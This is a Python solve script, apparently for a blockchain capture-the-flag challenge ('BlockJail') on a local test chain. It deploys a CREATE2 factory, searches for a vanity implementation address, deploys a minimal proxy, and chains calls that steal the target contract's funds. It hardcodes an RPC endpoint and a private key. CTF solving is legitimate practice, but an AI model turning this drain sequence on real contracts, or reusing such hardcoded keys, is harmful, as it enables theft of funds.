#!/usr/bin/env python3
import os
from dataclasses import dataclass

import solcx
from eth_account import Account
from eth_utils import keccak, to_bytes, to_checksum_address
from web3 import Web3


RPC_URL = os.environ.get(
    "RPC_URL", "http://34.2.147.230:8500/738804c3-013a-453a-9757-917659475304"
)
PRIVKEY = os.environ.get(
    "PRIVKEY", "d22eb6325a0e61163874c67b8e7a797a84f83913bd438b0a581e06abfc5530ce"
)
SETUP = to_checksum_address(
    os.environ.get("SETUP_CONTRACT_ADDR", "0x43D64a98B8b5Fbe55e8d1F71513228B2adDeB530")
)
TARGET = to_checksum_address(
    os.environ.get("TARGET_ADDR", "0xa7971caF6c753f68C75FC5f903DBE5eB00747988")
)
PALACE = to_checksum_address(
    os.environ.get("PALACE_ADDR", "0x66d7e5C148AF299D0447DDEd1BBC06fBA6AA0D4d")
)
CARD = bytes.fromhex(os.environ.get("CARD_HEX", "0001030001"))


SOURCE = """
pragma solidity ^0.8.20;

interface IBlockJail {
    function enter() external;
    function openPath() external;
    function infiltrate(bytes calldata card) external returns (bytes memory);
    function stealHeart() external;
}

contract Factory {
    function deploy(bytes memory code, bytes32 salt) external returns (address addr) {
        assembly {
            addr := create2(0, add(code, 0x20), mload(code), salt)
        }
        require(addr != address(0), "create2 failed");
    }
}

contract Impl {
    function poke() external {
        assembly {
            sstore(0, 0x42)
        }
    }

    function enter(address target) external {
        IBlockJail(target).enter();
    }

    function open(address target) external {
        IBlockJail(target).openPath();
    }

    function infiltrateOnly(address target, bytes calldata card) external {
        IBlockJail(target).infiltrate(card);
    }

    function steal(address target) external {
        IBlockJail(target).stealHeart();
    }

    function solve(address target, bytes calldata card) external {
        IBlockJail(target).openPath();
        IBlockJail(target).infiltrate(card);
        IBlockJail(target).stealHeart();
    }
}
"""


@dataclass
class Compiled:
    factory_bin: bytes
    impl_bin: bytes
    factory_abi: list
    impl_abi: list


def compile_contracts() -> Compiled:
    solcx.set_solc_version("0.8.20")
    out = solcx.compile_source(
        SOURCE,
        output_values=["abi", "bin"],
        optimize=True,
        optimize_runs=200,
    )
    factory = out["<stdin>:Factory"]
    impl = out["<stdin>:Impl"]
    return Compiled(
        factory_bin=bytes.fromhex(factory["bin"]),
        impl_bin=bytes.fromhex(impl["bin"]),
        factory_abi=factory["abi"],
        impl_abi=impl["abi"],
    )


def calc_create(sender: str, nonce: int) -> str:
    from rlp import encode

    sender_bytes = bytes.fromhex(sender[2:])
    return to_checksum_address(keccak(encode([sender_bytes, nonce]))[-20:])


def calc_create2(factory: str, salt: bytes, init_code: bytes) -> str:
    payload = b"\xff" + bytes.fromhex(factory[2:]) + salt + keccak(init_code)
    return to_checksum_address(keccak(payload)[-20:])


def proxy_runtime(impl: str) -> bytes:
    impl_bytes = to_bytes(hexstr=impl)
    if len(impl_bytes) != 20:
        raise ValueError(f"bad impl length: {len(impl_bytes)}")
    return bytes.fromhex("363d3d373d3d3d363d73") + impl_bytes + bytes.fromhex(
        "5af400"
    )


def proxy_initcode(runtime: bytes) -> bytes:
    if len(runtime) > 0xFF:
        raise ValueError("runtime too large")
    return bytes([0x60, len(runtime), 0x60, 0x0A, 0x5F, 0x39, 0x60, len(runtime), 0x5F, 0xF3]) + runtime


def send_tx(w3: Web3, acct: Account, tx: dict) -> dict:
    base = {
        "from": acct.address,
        "chainId": 31337,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "gasPrice": 1_000_000_000,
    }
    base.update(tx)
    if "gas" not in base:
        base["gas"] = w3.eth.estimate_gas(base)
    signed = acct.sign_transaction(base)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if receipt["status"] != 1:
        raise RuntimeError(f"transaction reverted: {tx_hash.hex()}")
    return receipt


def main() -> None:
    compiled = compile_contracts()
    w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 20}))
    acct = Account.from_key(PRIVKEY)

    print(f"wallet={acct.address}")
    print(f"balance={w3.eth.get_balance(acct.address)}")
    print(f"setup solved before={w3.eth.call({'to': SETUP, 'data': '0x64d98f6e'}).hex()}")

    factory_addr = calc_create(acct.address, w3.eth.get_transaction_count(acct.address))
    print(f"predicted factory={factory_addr}")
    print("deploying factory...")
    factory_receipt = send_tx(
        w3,
        acct,
        {
            "data": compiled.factory_bin,
        },
    )
    print(f"factory deployed at={factory_receipt['contractAddress']}")
    if to_checksum_address(factory_receipt["contractAddress"]) != factory_addr:
        raise RuntimeError("factory address prediction mismatch")

    print("searching create2 salt for impl vanity prefix 0x0000...")
    salt_int = 0
    impl_addr = None
    salt = None
    while True:
        salt = salt_int.to_bytes(32, "big")
        candidate = calc_create2(factory_addr, salt, compiled.impl_bin)
        if int(candidate, 16) <= (1 << 144) - 1:
            impl_addr = candidate
            break
        salt_int += 1
    print(f"impl salt={salt_int}")
    print(f"impl addr={impl_addr}")

    factory = w3.eth.contract(address=factory_addr, abi=compiled.factory_abi)
    deploy_data = factory.functions.deploy(compiled.impl_bin, salt).build_transaction(
        {"from": acct.address}
    )["data"]
    impl_receipt = send_tx(w3, acct, {"to": factory_addr, "data": deploy_data})
    print(f"impl deployed tx={impl_receipt['transactionHash'].hex()}")
    if len(w3.eth.get_code(impl_addr)) == 0:
        raise RuntimeError("implementation code missing")

    runtime = proxy_runtime(impl_addr)
    print(f"proxy runtime len={len(runtime)} bytes")
    if len(runtime) > 36:
        raise RuntimeError("proxy runtime too large")

    proxy_receipt = send_tx(w3, acct, {"data": proxy_initcode(runtime)})
    proxy_addr = to_checksum_address(proxy_receipt["contractAddress"])
    print(f"proxy={proxy_addr}")

    impl = w3.eth.contract(address=impl_addr, abi=compiled.impl_abi)

    enter_data = impl.functions.enter(TARGET)._encode_transaction_data()
    print("calling proxy.enter(target)...")
    send_tx(w3, acct, {"to": proxy_addr, "data": enter_data, "gas": 300000})

    open_data = impl.functions.open(TARGET)._encode_transaction_data()
    print("calling proxy.open(target)...")
    send_tx(w3, acct, {"to": proxy_addr, "data": open_data, "gas": 300000})
    print(f"pathOpened={w3.eth.call({'to': TARGET, 'data': '0x17052cac'}).hex()}")

    infil_data = impl.functions.infiltrateOnly(TARGET, CARD)._encode_transaction_data()
    print("calling proxy.infiltrateOnly(target, card)...")
    send_tx(w3, acct, {"to": proxy_addr, "data": infil_data, "gas": 800000})
    print(f"palace solved={w3.eth.call({'to': PALACE, 'data': '0x64d98f6e'}).hex()}")

    steal_data = impl.functions.steal(TARGET)._encode_transaction_data()
    print("calling proxy.steal(target)...")
    send_tx(w3, acct, {"to": proxy_addr, "data": steal_data, "gas": 300000})

    print(f"target balance={w3.eth.get_balance(TARGET)}")
    print(f"palace balance={w3.eth.get_balance(PALACE)}")
    print(f"wallet balance={w3.eth.get_balance(acct.address)}")
    print(f"setup solved after={w3.eth.call({'to': SETUP, 'data': '0x64d98f6e'}).hex()}")


if __name__ == "__main__":
    main()
